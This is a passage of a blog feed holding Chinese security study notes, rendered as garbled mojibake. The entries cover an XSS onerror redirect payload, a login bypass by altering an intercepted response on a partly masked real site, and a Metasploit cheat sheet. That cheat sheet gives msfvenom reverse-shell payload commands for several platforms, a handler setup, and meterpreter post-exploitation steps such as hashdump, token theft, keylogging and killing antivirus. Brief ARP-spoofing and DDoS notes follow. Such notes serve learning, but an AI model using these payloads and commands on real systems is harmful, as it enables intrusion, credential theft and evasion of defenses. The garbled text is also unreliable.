class="hljs-string">&quot;x&quot;</span>+onerror=location.href=`https:<span class="hljs-comment">//www.baidu.com`&gt;</span><br>              <span class="hljs-comment">// é”™è¯¯åˆ™è·³è½¬</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç™»å½•ç»•è¿‡</title>
    <link href="/2024/10/14/%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%AE%9E%E6%93%8D/"/>
    <url>/2024/10/14/%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E5%AE%9E%E6%93%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">å¹¿å·æ—¥æŠ¥ï¼šhttp:<span class="hljs-comment">//dy.xxxx:6699/</span><br></code></pre></td></tr></table></figure><h4 id="æŠ“åŒ…"><a href="#æŠ“åŒ…" class="headerlink" title="æŠ“åŒ…"></a>æŠ“åŒ…</h4><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230811143439.png" alt="å¾®ä¿¡æˆªå›¾_20230811143439"></p><h4 id="æ‹¦æˆªè¯·æ±‚åŒ…"><a href="#æ‹¦æˆªè¯·æ±‚åŒ…" class="headerlink" title="æ‹¦æˆªè¯·æ±‚åŒ…"></a>æ‹¦æˆªè¯·æ±‚åŒ…</h4><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230811143541.png" alt="å¾®ä¿¡æˆªå›¾_20230811143541"></p><h4 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">å°†<br><span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-number">1</span><br>æ”¹ä¸º<br><span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230811143658.png" alt="å¾®ä¿¡æˆªå›¾_20230811143658"></p><h4 id="æ”¾åŒ…å³å¯æˆåŠŸ"><a href="#æ”¾åŒ…å³å¯æˆåŠŸ" class="headerlink" title="æ”¾åŒ…å³å¯æˆåŠŸ"></a>æ”¾åŒ…å³å¯æˆåŠŸ</h4><p><img src="/image/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230811143725.png" alt="å¾®ä¿¡æˆªå›¾_20230811143725"></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MSFæ“ä½œæŒ‡ä»¤</title>
    <link href="/2024/06/14/MSF%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4/"/>
    <url>/2024/06/14/MSF%E6%93%8D%E4%BD%9C%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="MSFæ“ä½œæŒ‡ä»¤"><a href="#MSFæ“ä½œæŒ‡ä»¤" class="headerlink" title="MSFæ“ä½œæŒ‡ä»¤"></a>MSFæ“ä½œæŒ‡ä»¤</h2><h3 id="ä¸Šçº¿å‰"><a href="#ä¸Šçº¿å‰" class="headerlink" title="ä¸Šçº¿å‰"></a>ä¸Šçº¿å‰</h3><h4 id="msfå‘½ä»¤å¤§å…¨"><a href="#msfå‘½ä»¤å¤§å…¨" class="headerlink" title="msfå‘½ä»¤å¤§å…¨"></a>msfå‘½ä»¤å¤§å…¨</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php">ä»¥ä¸‹æ˜¯msfconsoleå‘½ä»¤çš„å®Œæ•´åˆ—è¡¨ï¼š<br><br><span class="hljs-comment">#æ ¸å¿ƒå‘½ä»¤</span><br>help                        æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„å‘½ä»¤<br>search                      åœ¨exploitåº“ä¸­æœç´¢exploitã€auxiliaryã€postã€encoderå’ŒNOP <br> <span class="hljs-comment">// ä¾‹å¦‚ search ms17</span><br>generator<br>info                        æ˜¾ç¤ºæœ‰å…³ä¸€ä¸ªæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯<br><span class="hljs-keyword">use</span>                         é€‰æ‹©å¹¶åŠ è½½ä¸€ä¸ªæ¨¡å—<br><span class="hljs-title">back</span>                        é€€å‡ºå½“å‰æ¨¡å—<br><span class="hljs-title">exit</span>                        é€€å‡º<span class="hljs-title">msfconsole</span><br><br>#ä¼šè¯å‘½ä»¤<br><span class="hljs-title">sessions</span>                    æ˜¾ç¤ºæ‰€æœ‰ä¼šè¯<br><span class="hljs-title">sessions</span> -<span class="hljs-title">i</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     ä¸ä¸€ä¸ªä¼šè¯è¿›è¡Œäº¤äº’<br><span class="hljs-title">sessions</span> -<span class="hljs-title">K</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     ç»ˆæ­¢ä¸€ä¸ªä¼šè¯<br><span class="hljs-title">sessions</span> -<span class="hljs-title">u</span> [<span class="hljs-title">session</span> <span class="hljs-title">ID</span>]     å¸è½½ä¸€ä¸ªæ¨¡å—<br><br>#æ•°æ®å­˜å‚¨å‘½ä»¤<br><span class="hljs-title">db_nmap</span>                     ä½¿ç”¨<span class="hljs-title">nmap</span>è¿›è¡Œæ‰«æå¹¶å°†ç»“æœä¿å­˜åˆ°æ•°æ®åº“<br><span class="hljs-title">db_import</span>                   ä»æ–‡ä»¶ä¸­å¯¼å…¥æ‰«æç»“æœåˆ°æ•°æ®åº“<br><span class="hljs-title">db_export</span>                   å°†æ‰«æç»“æœå¯¼å‡ºåˆ°æ–‡ä»¶<br><span class="hljs-title">creds</span>                       æ˜¾ç¤ºå‡­æ®ä¿¡æ¯<br><span class="hljs-title">vulns</span>                       æ˜¾ç¤ºæ¼æ´ä¿¡æ¯<br><br>#æ¼æ´åˆ©ç”¨å‘½ä»¤<br><span class="hljs-title">exploit</span>                     è¿è¡Œ<span class="hljs-title">Payload</span>ä»¥åˆ©ç”¨ç›®æ ‡ç³»ç»Ÿ<br><span class="hljs-title">set</span>                         è®¾ç½®<span class="hljs-title">Payload</span>çš„é€‰é¡¹<br><span class="hljs-title">show</span>                        æ˜¾ç¤ºå½“å‰æ¨¡å—çš„é€‰é¡¹<br><span class="hljs-title">unset</span>                       å–æ¶ˆè®¾ç½®æŸä¸ªé€‰é¡¹<br><span class="hljs-title">check</span>                       æ£€æŸ¥ç›®æ ‡ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ¼æ´<br><span class="hljs-title">run</span>                         è¿è¡Œå½“å‰æ¨¡å—<br><br>#è¾…åŠ©å·¥å…·å‘½ä»¤<br><span class="hljs-title">banner</span>                      æ˜¾ç¤º<span class="hljs-title">MSF</span>çš„<span class="hljs-title">logo</span>ä¿¡æ¯<br><span class="hljs-title">color</span>                       åˆ‡æ¢æ§åˆ¶å°é¢œè‰²<br><span class="hljs-title">history</span>                     æ˜¾ç¤ºå½“å‰æ§åˆ¶å°ä¸­æ‰§è¡Œçš„å‘½ä»¤åˆ—è¡¨<br><span class="hljs-title">sleep</span>                       æ§åˆ¶å°æš‚åœ<br><span class="hljs-title">version</span>                     æ˜¾ç¤º<span class="hljs-title">MSF</span>çš„ç‰ˆæœ¬ä¿¡æ¯<br><span class="hljs-title">reload_all</span>                  é‡æ–°åŠ è½½æ‰€æœ‰æ¨¡å—å’Œæ’ä»¶<br><span class="hljs-title">unload_all</span>                  å¸è½½æ‰€æœ‰æ¨¡å—å’Œæ’ä»¶<br><br>#å¤šæ¨¡å—ç®¡ç†å‘½ä»¤<br><span class="hljs-title">workspace</span>                   æ˜¾ç¤ºå½“å‰å·¥ä½œåŒº<br><span class="hljs-title">workspace</span> -<span class="hljs-title">a</span> [<span class="hljs-title">name</span>]         æ·»åŠ ä¸€ä¸ªæ–°çš„å·¥ä½œåŒº<br><span class="hljs-title">workspace</span> -<span class="hljs-title">d</span> [<span class="hljs-title">name</span>]         åˆ é™¤ä¸€ä¸ªå·¥ä½œåŒº<br><span class="hljs-title">workspace</span> [<span class="hljs-title">name</span>]            åˆ‡æ¢åˆ°ä¸€ä¸ªå·¥ä½œåŒº<br><span class="hljs-title">hosts</span>                       æ˜¾ç¤ºå½“å‰å·¥ä½œåŒºä¸­çš„ä¸»æœºåˆ—è¡¨<br><span class="hljs-title">services</span>                    æ˜¾ç¤ºå½“å‰å·¥ä½œåŒºä¸­çš„æœåŠ¡åˆ—è¡¨<br><span class="hljs-title">creds</span>                       æ˜¾ç¤ºå½“å‰å·¥ä½œåŒºä¸­çš„å‡­è¯åˆ—è¡¨<br><span class="hljs-title">vulns</span>                       æ˜¾ç¤ºå½“å‰å·¥ä½œåŒºä¸­çš„æ¼æ´åˆ—è¡¨<br><br>#æ’ä»¶å‘½ä»¤<br><span class="hljs-title">load</span>                        åŠ è½½æŒ‡å®šçš„æ’ä»¶<br><span class="hljs-title">unload</span>                      å¸è½½æŒ‡å®šçš„æ’ä»¶<br><span class="hljs-title">reload</span>                      é‡æ–°åŠ è½½æŒ‡å®šçš„æ’ä»¶<br></code></pre></td></tr></table></figure><h4 id="ç”Ÿæˆæœ¨é©¬"><a href="#ç”Ÿæˆæœ¨é©¬" class="headerlink" title="ç”Ÿæˆæœ¨é©¬"></a>ç”Ÿæˆæœ¨é©¬</h4><p>â€“msfvenomæ¨¡å—</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// =========================ç³»ç»Ÿæœ¨é©¬=======================</span><br><span class="hljs-comment">#æ­£å‘Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> LPORT=<span class="hljs-number">7668</span> -f elf &gt; luojunyi.elf<br><span class="hljs-comment">#åå‘Linux:</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">8008</span> -f elf &gt; shell.elf<br>windows:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> LPORT=<span class="hljs-number">3333</span> -f exe &gt; shell.exe<br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to<br>Connect On&gt; -f macho &gt; shell.macho<br>Android:<br>msfvenom -p android/meterpreter/reverse_tcp lhost=[ä½ çš„IP] port=[ç«¯å£] -<span class="hljs-number">0</span> ä¿å­˜è·¯å¾„/æ–‡ä»¶å.apk<br><span class="hljs-comment">//    ================ç¼–ç¨‹è¯­è¨€==================</span><br>PHP :<br>msfvenom -p php/meterpreter-reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Portto Connect on&gt; -f raw &gt; she11.php<br>cat she11.php l pbcopy &amp;&amp; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span>  tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shel1.php &amp;&amp; pbpaste &gt;&gt;she17.php<br></code></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹msfå‘½ä»¤"><a href="#æŸ¥çœ‹msfå‘½ä»¤" class="headerlink" title="æŸ¥çœ‹msfå‘½ä»¤"></a>æŸ¥çœ‹msfå‘½ä»¤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">msf  <span class="hljs-comment">// æŒ‰TAB  æŸ¥çœ‹å‘½ä»¤</span><br></code></pre></td></tr></table></figure><h4 id="æ‰“å¼€msfå‘½ä»¤"><a href="#æ‰“å¼€msfå‘½ä»¤" class="headerlink" title="æ‰“å¼€msfå‘½ä»¤"></a>æ‰“å¼€msfå‘½ä»¤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">msfconsole<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span>   //<span class="hljs-title">use</span> ç›‘å¬æ¨¡å—<br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333       <br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span>  //è®¾ç½®<span class="hljs-title">payload</span><br><span class="hljs-title">show</span> <span class="hljs-title">options</span>   // æŸ¥çœ‹é…ç½®<br><span class="hljs-title">run</span>      //å¼€å¯<br><span class="hljs-title">exit</span>   //é€€å‡º<br></code></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹ç«¯å£"><a href="#æŸ¥çœ‹ç«¯å£" class="headerlink" title="æŸ¥çœ‹ç«¯å£"></a>æŸ¥çœ‹ç«¯å£</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">netstat -ntlp  <span class="hljs-comment">//æŸ¥çœ‹ç«¯å£å¼€å‘æƒ…å†µ</span><br></code></pre></td></tr></table></figure><h4 id="payloadæœç´¢ä¸ä½¿ç”¨"><a href="#payloadæœç´¢ä¸ä½¿ç”¨" class="headerlink" title="payloadæœç´¢ä¸ä½¿ç”¨"></a>payloadæœç´¢ä¸ä½¿ç”¨</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">search</span> <span class="hljs-symbol">ms0170</span><br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æ“ä½œ"><a href="#å¸¸ç”¨æ“ä½œ" class="headerlink" title="å¸¸ç”¨æ“ä½œ"></a>å¸¸ç”¨æ“ä½œ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">meterpreter &gt; background è¿”å›åå°<br>meterpreter &gt; <span class="hljs-keyword">exit</span> å…³é—­ä¼šè¯<br>meterpreter &gt; help å¸®åŠ©ä¿¡æ¯<br>meterpreter &gt; sysinfo ç³»ç»Ÿå¹³å°ä¿¡æ¯<br>getuidmeterpreter &gt;screenshot å±å¹•æˆªå–<br>meterpreter &gt;meterpreter &gt; she11 å‘½ä»¤è¡Œ<span class="hljs-title function_ invoke__">she1</span> (<span class="hljs-keyword">exit</span>é€€å‡º)<br><br>meterpreter &gt; getlwd æŸ¥çœ‹æœ¬åœ°ç›®å½•<br>meterpreter &gt; lcd åˆ‡æ¢æœ¬åœ°ç›®å½•<br>meterpreter &gt; getwd æŸ¥çœ‹ç›®å½•<br>meterpreter &gt; ls æŸ¥çœ‹æ–‡ä»¶ç›®å½•åˆ—è¡¨<br>meterpreter &gt; cd åˆ‡æ¢ç›®å½•<br>meterpreter &gt; rm åˆ é™¤æ–‡ä»¶<br>meterpreter &gt; download C:\\users\\<span class="hljs-number">123</span>\\Desktop\\<span class="hljs-number">1</span>.txt <span class="hljs-number">1</span>.txtä¸‹è½½æ–‡ä»¶<br>meterpreter &gt; upload /<span class="hljs-keyword">var</span>/www/wce.exe wce.exe   <span class="hljs-comment">//  ä¸Šä¼ æ–‡ä»¶</span><br>meterpreter &gt; search -d c: -f *.docæœç´¢æ–‡ä»¶<br>meterpreter &gt; execute -f cmd.exe -i æ‰§è¡Œç¨‹åº/å‘½ä»¤<br>meterpreter &gt; psæŸ¥çœ‹è¿›ç¨‹<br>meterpreter &gt; run post/windows /capture/key1og_ recorder é”®ç›˜è®°å½•<br>meterpreter &gt; getuidæŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™<br>meterpreter &gt; <span class="hljs-keyword">use</span> <span class="hljs-title">priv</span>åŠ è½½ç‰¹æƒæ¨¡å—<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">getsystem</span> æå‡åˆ°<span class="hljs-title">SYSTEM</span>æƒé™<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">hashdump</span>å¯¼å‡ºå¯†ç æ•£åˆ—<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">ps</span>æŸ¥çœ‹é«˜æƒé™ç”¨æˆ·<span class="hljs-title">PID</span><br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">steal</span> <span class="hljs-title">token</span> &lt;<span class="hljs-title">PID</span>&gt; çªƒå–ä»¤ç‰Œ<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">rev2self</span> æ¢å¤åŸæ¥çš„ä»¤ç‰Œ<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">migrate</span> <span class="hljs-title">pid</span> è¿ç§»è¿›ç¨‹<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">killav</span> å…³é—­æ€æ¯’è½¯ä»¶<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">getgui</span>-<span class="hljs-title">e</span> å¯ç”¨è¿œç¨‹æ¡Œé¢<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">portfwd</span> <span class="hljs-title">add</span> -<span class="hljs-title">l</span> 1234 -<span class="hljs-title">p</span> 3389 -<span class="hljs-title">r</span> &lt;ç›®æ ‡<span class="hljs-title">IP</span>&gt; ç«¯å£è½¬å‘<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">get_local_subnets</span> è·å–å†…ç½‘ç½‘æ®µä¿¡æ¯<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">s</span> &lt;å†…ç½‘ç½‘æ®µ&gt;åˆ›å»ºè‡ªåŠ¨è·¯ç”±<br><span class="hljs-title">meterpreter</span> &gt; <span class="hljs-title">run</span> <span class="hljs-title">autoroute</span> -<span class="hljs-title">p</span> æŸ¥çœ‹è‡ªåŠ¨è·¯ç”±è¡¨<br><br>åˆ›å»ºä»£ç†é€šé“:<br><span class="hljs-title">msf</span> &gt; <span class="hljs-title">use</span> <span class="hljs-title">auxiliary</span>/<span class="hljs-title">server</span>/<span class="hljs-title">socks4a</span> è®¾ç½®<span class="hljs-title">socks4</span>ä»£ç†æ¨¡å—<br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">show</span> <span class="hljs-title">opti</span> <span class="hljs-title">ons</span><br><span class="hljs-title">msf</span> <span class="hljs-title">auxiliary</span>(<span class="hljs-title">socks4a</span>) &gt; <span class="hljs-title">run</span><br>é… ç½®<span class="hljs-title">proxychains</span>å‚æ•°:<br><span class="hljs-title">nano</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">prcxychains</span>.<span class="hljs-title">conf</span>ä¿®æ”¹ä»£ç†ç›‘å¬ç«¯å£ï¼Œå’Œå‰é¢ç«¯å£ä¸€è‡´<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arpä¸dnsä¸ddos</title>
    <link href="/2024/03/14/arp%E4%B8%8Edns%E4%B8%8Eddos/"/>
    <url>/2024/03/14/arp%E4%B8%8Edns%E4%B8%8Eddos/</url>
    
    <content type="html"><![CDATA[<h2 id="åº”æ€¥å“åº”"><a href="#åº”æ€¥å“åº”" class="headerlink" title="åº”æ€¥å“åº”"></a>åº”æ€¥å“åº”</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// åº”æ€¥å“åº”: æœåŠ¡å™¨è¢«å…¥ä¾µäº†ï¼Œå¹¶ä¸”è¢«å®¢æˆ·å‘ç°äº†ï¼Œç°åœ¨éœ€è¦ä½ å»æ¢å¤èµ„æ–™æˆ–è€…æ¸…ç†åé—¨</span><br><span class="hljs-number">1</span>.æ¢³ç†é»‘å®¢çš„æ”»å‡»è·¯çº¿<br><span class="hljs-number">2</span>.æ¸…ç†åé—¨<br><span class="hljs-number">3</span>.æµé‡ç›‘æµ‹<br><span class="hljs-number">4</span>.å®‰å…¨åŠ å›º<br><span class="hljs-number">5</span>.åº”æ€¥å“åº”äº‹ä»¶æ–‡æ¡£<br></code></pre></td></tr></table></figure><h4 id="APTæ”»å‡»"><a href="#APTæ”»å‡»" class="headerlink" title="APTæ”»å‡»"></a>APTæ”»å‡»</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment"># APTæ”»å‡» å³é«˜çº§å¯æŒç»­å¨èƒæ”»å‡»</span><br></code></pre></td></tr></table></figure><h4 id="kaliå®‰è£…apr"><a href="#kaliå®‰è£…apr" class="headerlink" title="kaliå®‰è£…apr"></a>kaliå®‰è£…apr</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">vim /etc/apt/sources.<span class="hljs-keyword">list</span><br><br>deb https:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br>deb-src https:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><br>apt-get update<br>apt-get install dsniff<br></code></pre></td></tr></table></figure><h4 id="APRæ¬ºéª—æ”»å‡»"><a href="#APRæ¬ºéª—æ”»å‡»" class="headerlink" title="APRæ¬ºéª—æ”»å‡»"></a>APRæ¬ºéª—æ”»å‡»</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#  ARPæ¬ºéª— =&gt; ä¸­é—´äººåŠ«æŒæ”»å‡»</span><br><br>ARPåè®®æ˜¯â€œAddress Resolution Protocolâ€(åœ°å€è§£æåè®®)çš„ç¼©å†™ã€‚æˆ‘ä»¬çŸ¥é“åœ¨å±€åŸŸç½‘ä¸­ï¼Œç½‘ç»œä»¥â€œå¸§â€çš„å½¢å¼ä¼ è¾“æ•°æ®ã€‚ä¸€ä¸ªä¸»æœºè¦å’Œå¦ä¸€ä¸ªä¸»æœºè¿›è¡Œç›´æ¥é€šä¿¡ï¼Œå¿…é¡»è¦çŸ¥é“ç›®æ ‡ä¸»æœºçš„MACåœ°å€ï¼Œç›®æ ‡ä¸»æœºçš„MACåœ°å€ç†åº”å°±åŒ…å«åœ¨æ•°æ®å¸§ä¸­ã€‚æ˜¾ç„¶åœ¨åŒæ–¹é€šä¿¡ä¹‹åˆï¼Œå‘é€æ–¹æ˜¯æ— æ³•çŸ¥é“ç›®æ ‡MACåœ°å€çš„ï¼Œå®ƒçš„è·å¾—å°±æ˜¯é€šè¿‡åœ°å€è§£æè¿™ä¸ªè¿‡ç¨‹ã€‚æ‰€è°“â€â€œåœ°å€è§£æâ€å°±æ˜¯ä¸»æœºåœ¨å‘é€å‰å°†ç›®æ ‡IPåœ°å€è½¬æ¢æˆç›®æ ‡MACåœ°å€çš„è¿‡ç¨‹ã€‚ARPåè®®çš„åŸºæœ¬åŠŸèƒ½å°±æ˜¯é€šè¿‡ç›®æ ‡è®¾å¤‡çš„IPåœ°å€ï¼ŒæŸ¥è¯¢ç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œä»¥ä¿è¯é€šä¿¡çš„é¡ºåˆ©è¿›<br>  <br><span class="hljs-number">1</span>.å…è´¹ARP<br><span class="hljs-number">2</span>.æ ‡å‡†ARP<br><span class="hljs-number">3</span>.ä»£ç†ARP<br>  <br><span class="hljs-number">1</span>.å…è´¹ARP:<br>sip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> smac xx-xx-xx-xx<br>dip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> dmac FF-FF-FF-<span class="hljs-title function_ invoke__">FF</span>(å¹¿æ’­åœ°å€)<br>  <br>  <br><br>  <br>  <br><span class="hljs-comment"># ARPåè®® æ¼æ´:</span><br>æœªè¿›è¡Œé‰´æƒè¡Œä¸º<br>è°å‘æˆ‘éƒ½æ”¶ æ”¶äº†å³æ›´æ–°<br></code></pre></td></tr></table></figure><h4 id="DNSåŠ«æŒ"><a href="#DNSåŠ«æŒ" class="headerlink" title="DNSåŠ«æŒ"></a>DNSåŠ«æŒ</h4><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br><br>#### DDOSé˜²å¾¡<br><br>```php<br><span class="hljs-number">1</span>.å¢åŠ å¸¦å®½( ä¸“çº¿)<br><span class="hljs-number">2</span>.æµé‡æ¸…æ´—(é˜²ç«å¢™æµé‡æ± )<br><span class="hljs-number">3</span>.cdn(äº‘ç›¾) æ¸…æ´—åŠŸèƒ½  =&gt;  <span class="hljs-number">6000</span><br>DDOSå°±æ˜¯æ¯”è°é’±å¤š<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
